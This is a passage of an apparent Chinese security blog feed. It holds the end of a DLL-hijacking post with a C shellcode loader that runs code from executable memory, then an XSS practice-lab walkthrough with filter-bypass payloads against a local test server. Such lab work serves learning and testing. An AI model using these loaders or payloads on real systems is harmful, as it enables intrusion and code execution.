VirtualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);<br>memcpy(<span class="hljs-built_in">exec</span>,buf,sizeof(buf));<br>CreateThread(0, 0, (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">exec</span>, 0, 0, 0);//创建线程运行shellcode<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d5f62eb7ed3b43d5babe73956e0d98de.png" alt="在这里插入图片描述"><br>然后生成文件<br>将生成的dll文件和原dll文件进行替换<br><img src="https://img-blog.csdnimg.cn/0895761ec881414ab1e1221d36a22602.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f80cbabc39714bd8b52544125348e0fe.png" alt="在这里插入图片描述"><br>注意payload的位数要和生产dll文件的位数一致</p><p>参考链接：<a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>dll劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss靶场练习</title>
    <link href="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>- Pass-1</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/xss/level1.php?name=&lt;script&gt;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1f8db8aa925a4080bf0d8fb0ae1db8c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过<br><strong>- Pass-2</strong><br>直接插入不行，引号将其包裹起了<br><img src="https://img-blog.csdnimg.cn/ed782acfbb184dc7a21481d7ea0e0e46.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;--</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/860786c3a44e4e63a264ee118f1f8c36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-3</strong><br>审查元素看看<br><img src="https://img-blog.csdnimg.cn/aa00ae981b8445ed9b2547212cc4870a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看似和2没啥区别 但与level2不同的是，value做了校验，双引号和尖括号都被校验了<br>可以集合单引号和事件来触发</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">‘ onclick=<span class="hljs-string">&#x27;alert(1)</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/93bd7072e7e345baa164cdd6a95d13fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><strong>- Pass-4</strong><br><img src="https://img-blog.csdnimg.cn/b0b677dd1e9942c59e9a9c2375b61d40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到对&lt; &gt;进行了过滤<br>由下图可以看出是双引号包裹得<br><img src="https://img-blog.csdnimg.cn/4b271fbaba1d476f827d704a359afd3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/11cce687faa54f9598dea121e846d1dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-5</strong><br><img src="https://img-blog.csdnimg.cn/e1f2a65dcaf24c0e8b68d1158d7fec54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>对script进行了过滤<br>看了下还是双引号包裹<br><img src="https://img-blog.csdnimg.cn/594cdb06b0ee4512a4c6727032c24389.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>过滤了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d3bc3678eb1343d2b3bae1010789cba4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看手源码<br><img src="https://img-blog.csdnimg.cn/16bc20b21ddb418cbf3a8805f97d8d49.png" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;  </span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2d1c3438c1414aed9ef8a8dd3e78b31f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-6</strong><br>过滤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><p>可大小写绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/98191544e8c347538a55c5d238d3bbf1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-7</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str =<span class="hljs-built_in">strtolower</span>( $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8ab3b7d236bc440f8a4201bcb15a4a40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-8</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br></code></pre></td></tr></table></figure><p>绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c51c6a21c5864a8a874cd843d5b7d8da.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-9</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br>echo <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span>您的链接不合法？有没有！<span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span><span class="hljs-string">&#x27;.$str7.&#x27;</span><span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="hljs-string">&lt;?php </span><br><span class="hljs-string">echo &quot;</span>&lt;h3 align=center&gt;payload的长度:<span class="hljs-string">&quot;.strlen($str7).&quot;</span>&lt;/h3&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/176725823c924c408925522c0142e34c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-10</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br>&lt;?php <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>从代码中可以看到是有几个隐藏参数的如下构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/xss/level10.php?name=1&amp;keyword=1&amp;t_sort=%22type=%22text%22%20onclick=%22alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bd82752d29a44cddab5dd9ad4de761d6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-11</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>显然只能从$str11&#x3D;$_SERVER[‘HTTP_REFERER’];入手了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5b21026d4fe64dc3b9d202bed10d8aca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/090010df24fb445aabb38716200d0530.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-12</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ea506e57dc6a4c3e97bfcc0640231bb0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这个就是从user-agent入手</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/068fbadd64c740f7950f0a81517eb734.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-13</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">setcookie</span><span class="hljs-params">(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>)</span></span>;<br><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str00 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>];<br>$str11=$_COOKIE[<span class="hljs-string">&quot;user&quot;</span>];<br>$str22=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11);<br>$str33=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22);<br>echo <span class="hljs-string">&quot;&lt;h2 